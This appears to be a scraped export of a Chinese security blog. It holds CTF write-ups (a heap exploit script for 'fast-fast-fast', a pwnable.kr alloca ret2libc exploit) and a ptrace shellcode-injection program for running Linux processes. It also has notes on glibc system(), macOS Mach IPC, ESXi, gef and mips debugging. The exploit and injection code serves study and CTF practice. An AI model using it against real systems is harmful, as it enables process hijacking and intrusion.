ptmalloc_lock_all+CD\u0018r为.text:00000000004082A0 sub rsp, 0D8h ; Alternative name is '_IO_printf' 在开启NX的情况下， 12345678$ checksec fast-fast-fast[*] '/home/muhe/Desktop/ctf_work/ichunqiu/pwn1/fast-fast-fast' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE 只能ROP了，要么ROP起shell(syscall那种)，要么mprotect改写内存属性执行写进去的sc。 3.exploit在完成任意地址读写之后，ROP链还没构造好…难过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123from zio import *from time import sleepLOCAL = TrueLITTLE = 0x1 #fastbinSMALL = 0x2 #smallbinif LOCAL: target = './fast-fast-fast'else: target = ('127.0.0.1',10001)io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))environ = 0x00000000006C3888def create(type,content): if(type == LITTLE): #little sercret io.read_until('choose option:') io.writeline('1') io.read_until('choose option:') io.writeline('1') io.read_until('please input your secret') io.writeline(str(content)) elif(type == SMALL): #small sercret io.read_until('choose option:') io.writeline('2') io.read_until('choose option:') io.writeline('1') io.read_until('please input your secret') io.writeline(str(content))def edit(type,new_content): if(type == LITTLE): #little sercret io.read_until('choose option:') io.writeline('1') io.read_until('choose option:') io.writeline('2') sleep(1) #io.read_until('please input your secret') io.writeline(str(new_content)) elif(type == SMALL): #small sercret io.read_until('choose option:') io.writeline('2') io.read_until('choose option:') io.writeline('2') sleep(1) #io.read_until('please input your secret') io.writeline(str(new_content))def delete(type): if(type == LITTLE): #little sercret io.read_until('choose option:') io.writeline('1') io.read_until('choose option:') io.writeline('3') elif(type == SMALL): #small sercret io.read_until('choose option:') io.writeline('2') io.read_until('choose option:') io.writeline('3')def say_sercret(): io.read_until('choose option:') io.writeline('3')def write2where(addr,data): edit(LITTLE,l64(1)+l64(0x1F0)+l64(addr)) edit(SMALL,data)def read_from_where(addr): edit(LITTLE,l64(1)+l64(0xF0F0)+l64(addr)) delete(SMALL) ret = io.read_until('choose') ret = ret[:len(ret)-6] ret = ret[len(ret)-6:] return retdef main(): io.gdb_hint([0x00000000004012CA,0x0000000000401433,0x0000000000401445]) #create fastbin and free create(LITTLE,'a') delete(LITTLE) #create SMALLBIN create(SMALL,'b') #double free here delete(LITTLE) #depart freed normal chunk create(LITTLE,'c') delete(LITTLE) #edit freed fastbin edit(SMALL,l64(0x00000000006C4AA0)) #.bss ---&gt; fastbin #get it say_sercret() #get chunk ptr --&gt; 0x6c4ab0 create(LITTLE,l64(0x00000000006C4A80)) #modify free() to printf() write2where(0x00000000006C3750,l64(0x00000000004082A0)) tmp = l64(read_from_where(environ).ljust(8,'\\x00')) print &quot;stack :&quot; + hex(tmp) #now,we get the stack's addr ,and we can read-write everywhere. io.interact()if __name__ =='__main__': main() Werewolf [还没做]","link":"/2017/02/16/ichunqiu-CTF-2017-2/"},{"title":"install gef","text":"0x00:gdb是linux下的调试利器，但无奈界面不太友好，所以需要一些辅助插件。 0x01:之前我一直使用的是pead,之前了解到还有个插件gef,因为gef支持多构架，而且heap的分析功能简直是CTF中的神器，所以决定装一波。 0x02: 问题在按照官方文档安装之后，一直提示有些模块无法加载，是因为一些依赖库没安装好 0x04:解决1234567891011121314151617# root at kali in ~ [3:35:23]$ cd unicorn # root at kali in ~/unicorn on git:master o [3:35:25]$ lsAUTHORS.TXT config.mk include libunicorn.so.1 Makefile README.md uc.dbindings COPYING LEAK_VALGRIND list.c make.sh samples uc.oChangeLog CREDITS.TXT libunicorn.a list.d pkgconfig.mk tests unicorn.pcconfig.log docs libunicorn.so list.o qemu uc.c# root at kali in ~/unicorn on git:master o [3:35:25]$ cd bindings # root at kali in ~/unicorn/bindings on git:master o [3:35:27]$ lsconst_generator.py dotnet go haskell java Makefile msvc python README ruby# root at kali in ~/unicorn/bindings on git:master o [3:35:28]$ cd python # root at kali in ~/unicorn/bindings/python on git:master o [3:35:34]$ sudo python setup.py install 然后就顺利解决了 0x04:安装的时候还是建议python3的版本，如果gdb不支持的话，那就只能重新编译了，多多关注gef项目的讨论区","link":"/2016/06/29/install-gef/"},{"title":"linux 下起shell失败的分析","text":"0x00: 起因之前在CTF中遇到过一种情况，执行了system(&quot;/bin/sh&quot;)，新进程也起来了，然而shell并没有起来的情况，很尴尬，于是决定好好分析一下为什么！拖延症的我拖了好久… 0x01: 先看源码我觉得最直观的应该是看linux关于system()调用实现的源码，然后写一个demo，直接起shell的那种，单步调试，对比分析，这样应该最直观了。 首先是源码 首先调用system()函数，其实是调用了do_system()函数 1234int system (const char *line){ return __libc_system (line);} 1234567891011121314151617181920int __libc_system (const char *line){ if (line == NULL) /* Check that we have a command processor available. It might ?not be available after a chroot(), for example. */ return do_system (\"exit 0\") == 0; /* 当line为NULL时，返回值为0，及执行bash –c exit 0*/ if (SINGLE_THREAD_P) return do_system (line); /*GCC cleanup exception range can cover the LIBC_CANCEL_ASYNC() and LIBC_CANCEL_RESET():http://sourceware.org/ml/libc-alpha/2011-08/msg00063.html */ int oldtype = LIBC_CANCEL_ASYNC (); int result = do_system (line); LIBC_CANCEL_RESET (oldtype); return result;}weak_alias (__libc_system, system) /* Execute LINE as a shell command, returning its status. */ 这里是do_system()函数的分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114do_system (const char *line){ int status, save; pid_t pid; struct sigaction sa;#ifndef _LIBC_REENTRANT struct sigaction intr, quit;#endif sigset_t omask; sa.sa_handler = SIG_IGN; sa.sa_flags = 0; __sigemptyset (&amp;sa.sa_mask); DO_LOCK (); /* mutex lock*/ if (ADD_REF () == 0) { if (__sigaction (SIGINT, &amp;sa, &amp;intr) &lt; 0) /*执行时 SIGINT被忽略*/ { SUB_REF (); goto out; } if (__sigaction (SIGQUIT, &amp;sa, &amp;quit) &lt; 0) /*执行时 SIGQUIT被忽略*/ { save = errno; SUB_REF (); goto out_restore_sigint; } } DO_UNLOCK (); /* We reuse the bitmap in the 'sa' structure. */ __sigaddset (&amp;sa.sa_mask, SIGCHLD); save = errno; if (__sigprocmask (SIG_BLOCK, &amp;sa.sa_mask, &amp;omask) &lt; 0) /*执行时设置SIG_BLOCK标志位，SIGCHLD被阻塞，执行失败，则恢复之前的信号的bitmap*/ {#ifndef _LIBC if (errno == ENOSYS) __set_errno (save); else#endif { DO_LOCK (); if (SUB_REF () == 0) { save = errno; (void) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL);out_restore_sigint: (void) __sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL); __set_errno (save); }out: DO_UNLOCK (); return -1; } }#ifdef CLEANUP_HANDLER CLEANUP_HANDLER;#endif /*执行成功，调用fork，生成子进程执行command命令*/#ifdef FORK pid = FORK (); /*调用SYS_CALL生成子进程*/#else pid = __fork ();#endif if (pid == (pid_t) 0) // { /* Child side. */ const char *new_argv[4]; //参数就是：bash -c 你的命令 new_argv[0] = SHELL_NAME; new_argv[1] = \"-c\"; new_argv[2] = line; new_argv[3] = NULL; /* Restore the signals. */ (void) __sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL); (void) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL); (void) __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL); INIT_LOCK (); /* Exec the shell. */ (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ); _exit (127); /*exec执行失败则返回127*/ } else if (pid &lt; (pid_t) 0) /* The fork failed. */ status = -1; else /*父进程，waitpid*/ /* Parent side. */ { /* Note the system() is a cancellation point. But since we call waitpid() which itself is a cancellation point we do not have to do anything here. */ if (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, 0)) != pid) status = -1; /*waitpid 失败返回1*/ }#ifdef CLEANUP_HANDLER CLEANUP_RESET;#endif save = errno; DO_LOCK (); if ((SUB_REF () == 0 &amp;&amp; (__sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL) | __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL)) != 0) || __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL) != 0) {#ifndef _LIBC /* glibc cannot be used on systems without waitpid. */ if (errno == ENOSYS) __set_errno (save); else#endif status = -1; } DO_UNLOCK (); return status;} 关于system函数的返回值： 当参数为空时，调用do_system (“exit 0”),返回值为NULL 调用result = do_system (line) 0x02 : 问题分析1. 先调试自己的一个demo12345678#include &lt;stdio.h&gt;int main(int argc, char const *argv[]){4write(1,\"test\\n\",5);4system(\"/bin/sh\");4return 0;} 执行到这里的时候(void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);gdb里如下所示 参数是这样的，单步之后，shell就起来了。 2. 之前有问题的exp因用的是之前百度杯的pwnme。地址在这里 ret到system()的时候gdb里调试 si单步分析和之前的test执行execve()的时候，参数对比，发现第第二个参数(rsi)有问题。首先是这个有问题的exp然后是我自己的demo 可以看到因为之前的某个操作，把/bin/sh给清了，这就导致执行了 sh -c null,也就是起了新进程，但是没shell~ 0x03 : 解决调整payload,把/bin/sh放在ret之后，调整下offset就好了。 1payload = \"\\x90\\x90\\x90\\x90/bin/sh\" 0x04 : 参考 system分析 joker ‘s help","link":"/2016/11/10/linux-%E4%B8%8B%E8%B5%B7shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%88%86%E6%9E%90/"},{"title":"linux code inject","text":"0x00 : 基础产生一个新的进程的方式 123sys_clone – creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);sys_execve – replaces the running process with a new one (has several variations in the C library);fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel). 0x01 : 实例目标程序代码 1234567891011#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;int main(void){ int i; for(i = 0;i&lt;10;i++){ printf(&quot;counter:%d\\n&quot;,i); sleep(2); } return 0;} 注入程序代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include&lt;stdio.h&gt;#include&lt;sys/ptrace.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;#include&lt;unistd.h&gt;#include&lt;string.h&gt;#include&lt;errno.h&gt;#include&lt;sys/syscall.h&gt;#include&lt;sys/user.h&gt;const int long_size = sizeof(long);void getdata(pid_t child, long addr,char* str,int len){ char * laddr; int i,j; union u{ long val; char chars[long_size]; }data; i = 0; j = len/long_size; laddr = str; while(i&lt;j){ data.val = ptrace(PTRACE_PEEKDATA,child,addr+i*4,NULL); memcpy(laddr,data.chars,long_size); ++i; laddr+=long_size; } j = len % long_size; if(j!=0){ data.val=ptrace(PTRACE_PEEKDATA,child,addr+i*4,NULL); memcpy(laddr,data.chars,j); } str[len]='\\0';}void putdata(pid_t child, long addr,char* str, int len){ int i,j; char *laddr; union u{ long val; char chars[long_size]; }data; i = 0; j = len/long_size; laddr = str; while(i&lt;j){ memcpy(data.chars,laddr,long_size); ptrace(PTRACE_POKEDATA,child,addr+i*4,data.val); ++i; laddr+=long_size; } j = len % long_size; if(j!=0){ memcpy(data.chars,laddr,j); ptrace(PTRACE_POKEDATA,child,addr+i*4,data.val); }}int main(int argc,char*argv[]){ pid_t traced_process; struct user_regs_struct regs,newregs; long ins; int k,h; int len=41; char shellcode[] = &quot;\\xeb\\x15\\x5e\\xb8\\x04\\x00\\x00\\x00&quot; &quot;\\xbb\\x02\\x00\\x00\\x00\\x89\\xf1\\xba&quot; &quot;\\x0c\\x00\\x00\\x00\\xcd\\x80\\xcc\\xe8&quot; &quot;\\xe6\\xff\\xff\\xff\\x48\\x65\\x6c\\x6c&quot; &quot;\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x0a\\x00&quot;; char backup[len]; long addr; if(argc!=2){ printf(&quot;command input error\\n&quot;); exit(1); } traced_process = atoi(argv[1]); //attach to process ptrace(PTRACE_ATTACH,traced_process,NULL,NULL); wait(NULL); //get curren regs ptrace(PTRACE_GETREGS,traced_process,NULL,&amp;regs); //print eip ins = ptrace(PTRACE_PEEKTEXT,traced_process,regs.eip,NULL); printf(&quot;EIP:%lx instruction executed: %lx\\n&quot;,regs.eip,ins); getdata(traced_process,regs.eip,backup,len); //print code printf(&quot;backup is :\\n&quot;); for(k = 0;k&lt;41;k++){ printf(&quot;%x &quot;,backup[k]); } printf(&quot;\\n&quot;); putdata(traced_process,regs.eip,shellcode,len); printf(&quot;shellcode is :\\n&quot;); for(k = 0;k&lt;41;k++){ printf(&quot;%x &quot;,shellcode[k]); } printf(&quot;\\n&quot;); //re-set args ptrace(PTRACE_SETREGS,traced_process,NULL,&amp;regs); //back ptrace(PTRACE_CONT,traced_process,NULL,NULL); //wait for change wait(NULL); printf(&quot;Press the enter key to continue\\n&quot;); getchar(); //recover the code putdata(traced_process,regs.eip,backup,len); ptrace(PTRACE_SETREGS,traced_process,NULL,&amp;regs); printf(&quot;excute origion code\\n&quot;); ptrace(PTRACE_DETACH,traced_process,NULL,NULL); return 0;} 0x02 : 效果","link":"/2018/06/16/linux-code-inject/"},{"title":"macOS IPC Study Notes","text":"1. 方式 MIG XPC DO …. 然而一切都是在Mach Msg的基础之上的。 2. 一些基础概念2.1 什么是Port个人理解就是类似Windows上handle的概念。用户态经过处理是一个类似socket的整数，内核态(namep)索引到与之对应的消息队列，IPC时通过Port传递数据到消息队列，或者从消息队列取出数据。 2.2.2 port name2.2.3 (port) right一个port和对这个port的访问权限，有对应的权限才能做对应的操作，比如recv，接收数据；send，发送数据。 1234567#define MACH_PORT_RIGHT_SEND ((mach_port_right_t) 0)#define MACH_PORT_RIGHT_RECEIVE ((mach_port_right_t) 1)#define MACH_PORT_RIGHT_SEND_ONCE ((mach_port_right_t) 2)#define MACH_PORT_RIGHT_PORT_SET ((mach_port_right_t) 3)#define MACH_PORT_RIGHT_DEAD_NAME ((mach_port_right_t) 4)#define MACH_PORT_RIGHT_LABELH ((mach_port_right_t) 5)#define MACH_PORT_RIGHT_NUMBER ((mach_port_right_t) 6) 2.2 创建流程示例代码： 12mach_port_t p;mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p); mach_port_allocate 函数定义如下: 12345678910111213kern_return_tmach_port_allocate( ipc_space_t space, mach_port_right_t right, mach_port_name_t *namep){ kern_return_t kr; mach_port_qos_t qos = qos_template; kr = mach_port_allocate_full (space, right, MACH_PORT_NULL, &amp;qos, namep); return (kr);} mach_port_allocate_full根据不同的right走不同的分配逻辑： ipc_port_alloc /ipc_port_alloc_name 两个函数区别只是是否指定了name。 ipc_object_alloc 348行通过一个宏，把port转name的方式获取namep，之后对ipc entry的关键结构进行初始化。 ipc_port_init 初始化port结构 至此，port初始化完成，namep初始化完成，可以根据namep索引到对应的内核中的消息队列。 port与ipc entry的关系，来自Mac OS X Internals: 其中的一些概念： 用户态 mach_port_t port在用户态表示，类似socket的一个整数 内核态 mach_port_name_t 1typedef natural_t mach_port_name_t; port在内核态表示 qos 1Structure used to pass information about port allocation requests.Must be padded to 64-bits total length. ipc space 12Each task has a private IPC spacea namespace for portsthat is represented by the ipc_space structure in the kernel. Mac OS X Internals 每个task都有自己的唯一一个ipc sapce, 其中 ipc_entry_t is_table; /* an array of entries */ 字段是放着所有的ipc entry。 task的结构体实在是太大了，从task的struct ipc_space *itk_space;字段索引到其对应的ipc space。 ipc entry 看源码发现，图中的ipc_tree_entry结构没了: 123456789101112struct ipc_space { lck_spin_t is_lock_data; ipc_space_refs_t is_bits; /* holds refs, active, growing */ ipc_entry_num_t is_table_size; /* current size of table */ ipc_entry_num_t is_table_free; /* count of free elements */ ipc_entry_t is_table; /* an array of entries */ task_t is_task; /* associated task */ struct ipc_table_size *is_table_next; /* info for larger table */ ipc_entry_num_t is_low_mod; /* lowest modified entry during growth */ ipc_entry_num_t is_high_mod; /* highest modified entry during growth */ int is_node_id; /* HOST_LOCAL_NODE, or remote node if proxy space */}; port的user reference计数是啥一个port的user reference只表示了某个entry在task的space中被多少个地方使用，和entry实际指向哪个port没有关系 2.3 发送MACH MSGmach msg的结构不再赘述，这部分直接看message.h头文件里的定义即可，下面着重看发送和接收过程。 其实是一个把mach msg转换成kmsg结构，然后入队(目标消息队列)的操作，目标进程获取就是一个出队的操作。 用户态(client) &lt;--&gt; 内核态 &lt;--&gt; 用户态(server) 收/发都是用mach_msg，使用options参数区别是收还是发。 2.3.1 流程123456789101112131415161718mach_msg(...) mach_msg_trap(...) mach_msg_overwrite_trap(...) option &amp; MACH_SEND_MSG --&gt; mach_msg_send // mach_msg --&gt; kmsg // alloc a kernel msg buffer(kmsg), and copy user mach_msg to kernel msg buffer ipc_kmsg_get(msg_addr, send_size, &amp;kmsg); ipc_kmsg_copyin ipc_kmsg_copyin_hearder(kmsg, space, override, optionp) ipc_kmsg_copyin_body(kmsg, space, map, optionp) ipc_kmsg_send ipc_voucher_send_preprocessing(kmsg); ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg,option,send_timeout); option &amp; MACH_RCV_MSG //TODO ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object); mach_msg_rcv_link_special_reply_port(...) ipc_mqueue_receive mach_msg_receive_results 2.3.2 发送 mach_msg_send( mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_timeout_t send_timeout, mach_msg_priority_t override) 根据消息大小重新分配了内存，并且把消息拷贝进来，并且消息尾部增加了一些字段: 12345trailer = (mach_msg_max_trailer_t *) ((vm_offset_t)kmsg-&gt;ikm_header + send_size);trailer-&gt;msgh_sender = current_thread()-&gt;task-&gt;sec_token;trailer-&gt;msgh_audit = current_thread()-&gt;task-&gt;audit_token;trailer-&gt;msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE; 之前审服务的时候遇到过，还以为这部分是可控的，造成乌龙。 囧 ipc_kmsg_copyin(kmsg, space, map, override, &amp;option); 此时kmsg是新分配的内存，里面放的是要发送的mach msg， space和map都是当前task的space和map，直接获取，这部分有个图，可以看Macos Internals。 ipc_kmsg_copyin_header(kmsg, space, override, optionp); 拷贝 port rights，成功的话，原本消息中(kmsg)的port name都会被替换成对应的对象的指针。 ipc_kmsg_copyin_body( kmsg, space, map); 拷贝msg body部分，中间验证了size、desc部分的size，类型等字段。 desc_count &lt; 0x3fff 。 descriptor_size部分，必须是desc*16 == descriptor_size，不满足会为了对齐而调整。 最终完成拷贝，把用户态的mach msg拷贝到了kmsg中。 ipc_kmsg_send(kmsg, option, send_timeout); 到这里的时候port right拷贝了，消息内容也拷贝了，该直接发送了。把消息发送到dst的消息队列里。 对于发送给内核的消息和非内核的消息分开处理 内核：kmsg = ipc_kobject_server(kmsg, option); 其他：ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout); 2.3.3 接收 ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object); Convert a name in a space to a message queue. 根据这个recv_name在space里找到ipc_entry结构，从而找到其中ipc_object-&gt;ipmessage结构。 mach_msg_rcv_link_special_reply_port(…) ipc_mqueue_receive(mqueue, option, rcv_size, msg_timeout, THREAD_ABORTSAFE); Receive a message from a message queue 之前得到了消息队列mqueue，这个函数就是从这个消息队列中取出消息。 ipc_mqueue_receive_on_thread使用指定thread从消息队列中接收消息。接受分port set(imq_is_set()) 和 单个port(imq_is_queue())，这部分看message queue的结构体也能看出来必须要这么处理。 消息队列是一个循环双向链表，取消息的过程就是一个 unlink的过程： mach_msg_receive_results Receive a message， copy out的操作，把之前“解链”的消息拷贝出来。 3. 引用再谈Mach-IPCMac OS X InternalsMOXilAuditing and Exploiting Apple IPC – Ianbeerbazad","link":"/2019/09/20/macOS-IPC-Study-basic-2/"},{"title":"macOS on ESXi","text":"VMWare ESXI 配置macOS虚拟机 需要的工具/ISOunlocker3.0 或者 unlocker macOS的ISO自行下载 过程给esxi打补丁1. unlocker3.0 登陆网页端esxi管理，打开服务器的ssh服务。 在macOS的系统上构建好unlocker 1python esxi-build.py ssh登陆进去，把上个步骤得到的所有东西上传到服务器。 打补丁 12345tar -zxvf esxi-unlocker-300.tgzchmod a+x *.sh./esxi-install.sh# then reboot your serverreboot 2. 其他版本unlocker直接复制到服务器，然后执行esxi-install.sh，随后重启服务器。 安装vm这里esxi的版本是6.7，按理说兼容6.5。 直接把镜像上传到服务器上，然后直接新建vm。 但是这里得到报错： 1smc read error k0 esxi xxxxx 无法解决。 导入ovf使用低版本vm workstation(12)，选择兼容性esxi 6.5，建立一个macos的虚拟机，然后导出ovf，然后部署到服务器上。 这里注意：导出前移除光驱加载的镜像，否则部署会失败。 这种方式，能部署上去，但是无限重启，内核无法加载起来。 安装vm plan B更换了unlocker的补丁，就能正常安装了。 这里看起来应该是unlocker补丁的问题 - -。 玄学","link":"/2019/05/10/macOS-on-ESXi/"},{"title":"make-script-to-macOS App","text":"0x00 : 需求主要是Ghidra这个东西，每次启动都要命令行 GhidraRun，太麻烦了，所以就想把这个启动脚本封装成一个macOS的APP，方便使用。 0x01 : 过程直接使用了 别人写好的appfiy.sh ，我用的是原作者的，链接里的是二次开发的，其实本质是一样的。 123456789101112131415#!/usr/bin/env bashAPPNAME=${2:-$(basename &quot;${1}&quot; '.sh')};DIR=&quot;${APPNAME}.app/Contents/MacOS&quot;;if [ -a &quot;${APPNAME}.app&quot; ]; then echo &quot;${PWD}/${APPNAME}.app already exists :(&quot;; exit 1;fi;mkdir -p &quot;${DIR}&quot;;cp &quot;${1}&quot; &quot;${DIR}/${APPNAME}&quot;;chmod +x &quot;${DIR}/${APPNAME}&quot;;echo &quot;${PWD}/$APPNAME.app&quot;; 因为macOS下app本质是一个目录，所以只需要按照特定的格式构建这个目录即可。 1234567891011❯ cd /Applications/Ghidra.app╭─    /Applications/Ghidra.app ·· ✔  at 12:51:35 ╰─❯ lsContents Icon?❯ tree ..├── Contents│ └── MacOS│ └── Ghidra└── Icon\\r 本来我是把ghrida的启动脚本直接放进来的，但是发现有一些目录的问题，索性直接绝对路径启动这个脚本好了(懒省事儿啊 hhh) 12345678#!/usr/bin/env bash#----------------------------------------# Ghidra launch#----------------------------------------/Users/muhe/Tools/ghidra/ghidraRun 最后，图标可以先复制你想用的图片，然后对app右键，get info，点击信息栏上面的小图标，之后cmd+v就行了，也挺方便。 最后，就可以很舒服的启动了。 0x02 : 参考shell-script-mac-apps","link":"/2020/08/07/make-script-to-macOS-App/"},{"title":"macOS IPC Study basic","text":"算是个读书笔记吧，把利用Port进行IPC的这个过程转成自己的理解。 Scenario 1 : Alice &amp;&amp; BobAlice 提前知道Bob，即： 1Alice processes a `SEND` right to a port whose `RECEIVE` right is held by Bob. Alice 创建一个临时port，她对这个port有 RECEIVEright Alice 对创建的port添加 SENDright Alice 使用提前知晓的对其有 SENDright的port，把她刚创建的临时port向Bob发过去 Bob接收到这个Alice创建的port之后，Bob可以利用这个port和Alice通信，因为这个临时port有 SENDright 和 RECEIVEright Scenario 2 : Bootstrap server (regstrain)场景1有点类似先有鸡和先有蛋的问题，即最开始Alice咋知道Bob的(最开始 SENDright 的port哪里来的？)，所以这里引入了一个中间人— bootstrap Bob: Bob 对 bootstrapserver 持有 SEND rightport Bob 创建另外的port，对其有 RECEIV right, 并且对其创建 SEND right，然后利用最开始对 bootstrap持有的 SEND RIGHTport，把新创建的这个 SEND right发过去。 同时，发送过去的 SEND right有一个别名，可以方便索引到这个 SEND right，这里叫 com.apple.Bob Alice: 同样的，Alice对 bootstrap server，持有 SEND rightport Alice发送消息给 bootstrap server，查询 com.apple.Bob，想要获取对Bob的 SEND right bootstrap server接收到之后，根据Alice提供的别名查询，找到之后，返回对应的 SEND right给Alice 至此，Alice可以使用获得的这个 SEND right和Bob通信了(别忘了上面说的，Bob对这个port有 RECEIVE right) Scenario 3: Bootstrap server (check-in)这种比较麻烦，出于安全考虑的设计 ： bootstrap server 怎么确定这个服务的确就是真的服务呢？而不是某个别有用心的程序冒充的呢？ 系统初始化的时候，bootstrap server 初始化所有的服务，对这些服务有 RECEIVE right Alice通过 bootstrap_lookup()想要获取想要的服务(com.apple.Bob)的 SEND right 此时，bootstrap server拿到了这个请求，此时Bob这个服务还不存在，这个时候需要bootstrap server 使用 fork()``exec()等api产生这个服务（当然权限也要设计好） 此时Bob存在了，醒来了，他使用 bootstrap_check_in()向 bootstrap server申请对自己服务的port的 RECEIVE right bootstrap server会对这个申请的port(此时Bob是它唯一的拥有者)创建 SEND right，然后发送给Alice 至此，两人可以通信了 Reference*OS Internals Volume I User Mode – Jonathan Levin","link":"/2019/08/20/macOS-IPC-Study-basic/"},{"title":"mips程序调试环境折腾","text":"0x00 : 起因比赛遇到了，帮学弟折腾调试环境，中间踩坑无数，但是最后还是解决了，就记录下。 0x01 : 最初尝试最初尝试在Linux虚拟机里，qemu + gdbserver的搞事情，但是，依赖问题太闹心了，各种交叉编译的蛋疼事情。 所以就放弃了。 0x02 : docker专治环境搭建后来想了想，我为啥不用docker神器，肯定有人和我一样不想弄交叉编译环境，所以肯定搞了这样的镜像～ Google搜索一大堆之后： multiarch-docker cross 这两个还不错，我选择了第一个来使用。 0x03 : 使用过程1. 获取所需镜像1docker pull skysider/multiarch-docker 2. 启动12345678$ docker run -it \\ --rm \\ -h baby_mips \\ --name baby_mips \\ -v $(pwd):/ctf/work \\ -P \\ --cap-add=SYS_PTRACE \\ skysider/multiarch-docker 3. 复制文件1$ docker cp ~/Downloads/baby_mips.dms 207187a8a24d:/tmp/ 4. 调试这里需要开两个bash，在启动容器的时候已经有一个bahs了， 1docker ps -a 看看当前这个容器的id，然后： 1docker exec -it id /bin/bash 得到两个bash，一个运行程序，一个gdb窗口。 运行程序： 1qemu-mipsel -g 2333 ./demo gdb调试端口是2333 gdb窗口： 1gdb-multiarch ./demo 然后gdb里 1target remote localhost:2333 gdb里好像不用set arch了，pwngdb插件自动识别了好像 囧 5. have funEnjoy your debug journey~","link":"/2018/04/19/mips%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%8A%98%E8%85%BE/"},{"title":"pwnable.kr -- alloca","text":"0x00:好久没玩了…去年十月以后就没玩过了TAT 这几天把peach的坑，winafl的坑填了下，就来搞下pwn。 0x01:这个程序是给了源码的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void clear_newlines(){ int c; do{ c = getchar(); }while (c != '\\n' &amp;&amp; c != EOF);}int g_canary;int check_canary(int canary){ int result = canary ^ g_canary; int canary_after = canary; int canary_before = g_canary; printf(\"canary before using buffer : %d\\n\", canary_before); printf(\"canary after using buffer : %d\\n\\n\", canary_after); if(result != 0){ printf(\"what the f...??? how did you fucked this buffer????\\n\"); } else{ printf(\"I told you so. its trivially easy to prevent BOF :)\\n\"); printf(\"therefore as you can see, it is easy to make secure software\\n\"); } return result;}int size;char* buffer;int main(){ printf(\"- BOF(buffer overflow) is very easy to prevent. here is how to.\\n\\n\"); sleep(2); printf(\" 1. allocate the buffer size only as you need it\\n\"); printf(\" 2. know your buffer size and limit the input length\\n\\n\"); printf(\"- simple right?. let me show you.\\n\\n\"); sleep(2); printf(\"- whats the maximum length of your buffer?(byte) : \"); scanf(\"%d\", &amp;size); clear_newlines(); printf(\"- give me your random canary number to prove there is no BOF : \"); scanf(\"%d\", &amp;g_canary); clear_newlines(); printf(\"- ok lets allocate a buffer of length %d\\n\\n\", size); sleep(1); buffer = alloca( size + 4 ); // 4 is for canary printf(\"- now, lets put canary at the end of the buffer and get your data\\n\"); printf(\"- don't worry! fgets() securely limits your input after %d bytes :)\\n\", size); printf(\"- if canary is not changed, we can prove there is no BOF :)\\n\"); printf(\"$ \"); memcpy(buffer+size, &amp;g_canary, 4); // canary will detect overflow. fgets(buffer, size, stdin); // there is no way you can exploit this. printf(\"\\n\"); printf(\"- now lets check canary to see if there was overflow\\n\\n\"); check_canary( *((int*)(buffer+size)) ); return 0;} 主要还是需要突破他的防护，拿到shell。看下bin文件开了什么保护：调试发现，check_canary()函数返回的时候，如果恰当的设置g_canary的值，就可以控制返回地值。然后我就卡在这里了…开启了NX，只能ROP的思路搞，但是ROP链又不知道哪里放置。 0x02:后来参考了别人的做法，才发现这是个本地利用…直接按照以前玩overthewire学来的套路就可以：sc放在环境变量离，然后确定地址，直接改返回地值过去就可以了。不过首先要利用ulimit -s unlimited去固定下libc的加载地址，然后才可以确定system()和/bin/sh地址。 附上我本地调试的时候的exp，环境不同，所以地址可能不同。 123456789101112131415161718192021from pwn import *import osoff_system = 0x0003d3e0 # objdump -d /lib/i386-linux-gnu/libc.so.6 | grep systemoff_shell = 0x0015ea69 # grep -oba /bin/sh /lib/i386-linux-gnu/libc.so.6adr_libc = 0x40047000 # ldd allocaadr_payload = 0x40025857 # searchmem \"AAAA\"payload = p32(adr_libc + off_system)payload += p32(0xdeadbeef)payload += p32(adr_libc + off_shell)#test = \"AAAABBBBCCCC\"#p = process('./alloca', env = {'LD_PRELOAD': test})p = process('./alloca', env = {'LD_PRELOAD': payload})#raw_input(\"$$\")p.sendline(str(-92))p.sendline(str((adr_payload + 4) ^ 0x08048250))p.interactive()'''0x40025857 ^ 0x08048250 --&gt; 0x4806da07Cannot access memory at address 0x4806da030x40025857 + 4''' 